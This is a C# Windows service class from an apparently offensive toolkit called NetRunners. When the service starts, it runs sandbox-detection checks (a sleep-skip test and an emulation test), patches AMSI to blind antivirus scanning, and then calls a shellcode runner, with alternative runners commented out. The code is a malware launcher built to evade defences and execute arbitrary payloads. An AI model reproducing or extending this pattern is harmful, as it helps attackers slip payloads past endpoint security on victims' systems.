using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using static NetRunners.Runners;
using static NetRunners.Heuristics;
using static NetRunners.Patchers;

namespace NetRunners
{
    /// <summary>
    /// Service function, calls Heurisitic functions, and calls a runner of your choice.
    /// Retrieves Heuristic functions from Heuristics class and Runner functions from Runners class.
    /// Accepts one or no arguments at runtime. By default (no args specified), calls Runner function (Simple shellcode runner).
    /// </summary>
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            // call heuristic functions
            if (Sleep()) { return; }    // if sleep was skipped halt execution
            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution

            // call amsi patch
            AmsiOs();

            // call desired function (uncomment choice)
            // PiRunner();
            // Runner();
            EpsRunner();
        }

        protected override void OnStop()
        {
        }
    }
}
